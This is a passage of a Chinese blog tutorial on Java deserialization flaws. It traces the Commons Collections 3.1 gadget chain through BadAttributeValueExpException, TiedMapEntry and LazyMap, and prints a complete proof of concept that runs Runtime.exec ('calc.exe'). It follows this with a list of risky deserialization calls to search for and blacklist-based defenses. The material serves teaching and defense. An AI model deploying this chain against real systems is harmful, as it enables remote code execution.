class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BadAttributeValueExpException</span> <span class="keyword">extends</span> <span class="title">Exception</span>   </span>&#123;</span><br><span class="line">    <span class="comment">/* Serial version */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">3105272988410493376L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@serial</span> A string representation of the attribute that originated this exception.</span></span><br><span class="line"><span class="comment">     * for example, the string value can be the return of &#123;<span class="doctag">@code</span> attribute.toString()&#125;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Object val;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructs a BadAttributeValueExpException using the specified Object to</span></span><br><span class="line"><span class="comment">     * create the toString() value.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> val the inappropriate value.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BadAttributeValueExpException</span> <span class="params">(Object val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.val = val == <span class="keyword">null</span> ? <span class="keyword">null</span> : val.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the string representing the object.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span>  </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"BadAttributeValueException: "</span> + val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">        Object valObj = gf.get(<span class="string">"val"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">            val = <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">"@"</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>查看自定义的readObejct()方法，其中在满足System.getSecurityManager() == null时会调用 valObj.toString()，从攻击思路上看，其他的条件都是无法满足的。因此valObj.toString()就成为了突破口，此时要找到一个合适的工具在toString()方法被调用的时候会触发我们构造的恶意代码。</p><h3 id="3、查找可通过toString-触发transform-方法的合适的类"><a href="#3、查找可通过toString-触发transform-方法的合适的类" class="headerlink" title="3、查找可通过toString()触发transform()方法的合适的类"></a>3、查找可通过toString()触发transform()方法的合适的类</h3><p>从BadAttributeValueExpException类的readObejct()方法知道，关注点在valObj.toString()中，那么现在就需要找到一个合适的类在调用toString()方法时触发transform()方法来执行我们构造的反射链。</p><p><strong>LazyMap——调用get()方法触发transform()方法</strong></p><p>LazyMap是Commons-collections 3.1提供的一个工具类，是Map的一个实现，主要的内容是利用工厂设计模式，在用户get一个不存在的key的时候执行一个方法来生成Key值，当且仅当get行为存在的时候Value才会被生成。其定义代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyMap</span> <span class="keyword">extends</span> <span class="title">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title">Map</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">7990956402564206740L</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Factory factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Factory factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Factory must not be null"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Factory must not be null"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.factory = factory;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        out.defaultWriteObject();</span><br><span class="line">        out.writeObject(<span class="keyword">this</span>.map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="keyword">this</span>.map = (Map)in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.map.containsKey(key)) &#123;</span><br><span class="line">            Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">            <span class="keyword">this</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>LazyMap测试代码，在get一个不存在的key的时候执行一个方法来生成Key值，下面的代码运行结果会调用transform()输出”Mi1k7ea”：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Map targetMap = LazyMap.decorate(<span class="keyword">new</span> HashMap(), <span class="keyword">new</span> Transformer() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"Mi1k7ea"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(targetMap.get(<span class="string">"hhhhhhhh"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>TiedMapEntry——调用toString()方法触发getValue()方法（即LazyMap.get()）</strong></p><p>TiedMapEntry也存在于Commons-collections 3.1，该类主要的作用是将一个Map绑定到Map.Entry下，形成一个映射。</p><p>主要代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title">Entry</span>, <span class="title">KeyValue</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">8453869361373831205L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map map;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object key;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TiedMapEntry</span><span class="params">(Map map, Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.map = map;</span><br><span class="line">        <span class="keyword">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="keyword">this</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Cannot set value to this map entry"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.map.put(<span class="keyword">this</span>.key, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="keyword">this</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> Entry)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">boolean</span> var10000;</span><br><span class="line">            label43: &#123;</span><br><span class="line">                label29: &#123;</span><br><span class="line">                    Entry other = (Entry)obj;</span><br><span class="line">                    Object value = <span class="keyword">this</span>.getValue();</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>.key == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (other.getKey() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span> label29;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">this</span>.key.equals(other.getKey())) &#123;</span><br><span class="line">                        <span class="keyword">break</span> label29;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (other.getValue() == <span class="keyword">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span> label43;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value.equals(other.getValue())) &#123;</span><br><span class="line">                        <span class="keyword">break</span> label43;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var10000 = <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">return</span> var10000;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var10000 = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">return</span> var10000;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.getValue();</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">this</span>.getKey() == <span class="keyword">null</span> ? <span class="number">0</span> : <span class="keyword">this</span>.getKey().hashCode()) ^ (value == <span class="keyword">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getKey() + <span class="string">"="</span> + <span class="keyword">this</span>.getValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析下这个类，首先是toString()中调用了getValue()，而getValue()中实际是map.get(key)，如此一来就构建起了整个调用链接了。</p><h3 id="构造过程小结"><a href="#构造过程小结" class="headerlink" title="构造过程小结"></a>构造过程小结</h3><p><strong>BadAttributeValueExpException</strong></p><p>这里将上述分析的调用过程做个图清晰地列出来，相信应该很明确该反射链执行的过程了：</p><p><img src="/2019/02/06/Java反序列化漏洞/5.png" alt="demo3"></p><p><strong>最终构造的代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"calc.exe"</span>,&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(<span class="keyword">new</span> HashMap(), transformerChain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"foo"</span>);</span><br><span class="line">        BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//利用反射的方式来向对象传参</span></span><br><span class="line">        Field valfield = val.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(val, entry);</span><br><span class="line"></span><br><span class="line">        test t = <span class="keyword">new</span> test();</span><br><span class="line">        t.deserialize(t.serialize(val));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  Object <span class="title">deserialize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ByteArrayInputStream in = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">        ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果，弹出计算器：</p><p><img src="/2019/02/06/Java反序列化漏洞/3.png" alt="demo3"></p><h2 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h2><p>全局搜索ObjectInputStream类，检查是否调用readObject()方法，若存在该方法则检查其是否进行了重写，若重写了readObject()方法则需严格排查是否可构造反射链来执行任意命令。</p><p>当然，结合其他几个类型的Java反序列漏洞，全局搜索的类方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject</span><br><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject</span><br><span class="line">Yaml.load</span><br><span class="line">XStream.fromXML</span><br><span class="line">ObjectMapper.readValue</span><br><span class="line">JSON.parseObject</span><br></pre></td></tr></table></figure><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><h3 id="1、重写ObjectInputStream的resolveClass-，设置黑白名单机制"><a href="#1、重写ObjectInputStream的resolveClass-，设置黑白名单机制" class="headerlink" title="1、重写ObjectInputStream的resolveClass()，设置黑白名单机制"></a>1、重写ObjectInputStream的resolveClass()，设置黑白名单机制</h3><p>最常见的方法，就是在ObjectInputStream中设置黑白名单机制的方式进行防御。下面就在Apache Commons Collections反序列化漏洞示例代码中直接添加防御代码。</p><p>写一个SecureObjectInputStream类，继承于ObjectInputStream，重写resolveClass()方法实现黑名单机制过滤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SecureObjectInputStream</span> <span class="keyword">extends</span> <span class="title">ObjectInputStream</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SecureObjectInputStream</span><span class="params">(InputStream inputStream)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Only deserialize instances of our expected Bicycle class</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!desc.getName().equals(BadAttributeValueExpException.class.getName())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(<span class="string">"触发黑名单机制，禁止反序列化恶意类对象"</span>, desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着只需在调用代码中将ObjectInputStream替换为SecureObjectInputStream来创建ObjectInputStream对象。再次运行时发现，触发黑名单机制，无法进行反序列化漏洞的利用：</p><p><img src="/2019/02/06/Java反序列化漏洞/6.png" alt="demo3"></p><h3 id="2、利用SerialKiller-jar"><a href="#2、利用SerialKiller-jar" class="headerlink" title="2、利用SerialKiller.jar"></a>2、利用SerialKiller.jar</h3><p>原理和上面是一样的，只是已经是成熟的轮子了可以直接使用。具体的参考<a href="https://github.com/ikkisoft/SerialKiller" target="_blank" rel="noopener">https://github.com/ikkisoft/SerialKiller</a></p><p>创建sk.conf配置文件在本地项目根目录中，其中只设置了黑名单过滤BadAttributeValueExpException：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- serialkiller.conf --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">config</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">refresh</span>&gt;</span>6000<span class="tag">&lt;/<span class="name">refresh</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mode</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">profiling</span>&gt;</span>false<span class="tag">&lt;/<span class="name">profiling</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">mode</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">logging</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>false<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">logging</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">blacklist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>.*BadAttributeValueExpException$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">blacklist</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">whitelist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>.*<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">whitelist</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将SerialKiller.jar添加进Java项目中，并将其替换掉ObjectInputStream来创建ObjectInputStream对象。运行后发现，黑名单过滤了BadAttributeValueExpException类并抛出错误无法往下执行：</p><p><img src="/2019/02/06/Java反序列化漏洞/7.png" alt="demo3"></p><h3 id="3、禁止JVM执行外部命令Runtime-exec"><a href="#3、禁止JVM执行外部命令Runtime-exec" class="headerlink" title="3、禁止JVM执行外部命令Runtime.exec"></a>3、禁止JVM执行外部命令Runtime.exec</h3><p>通过扩展SecurityManager可以实现，这里添加一个函数，在进行反序列化操作之前调用即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span 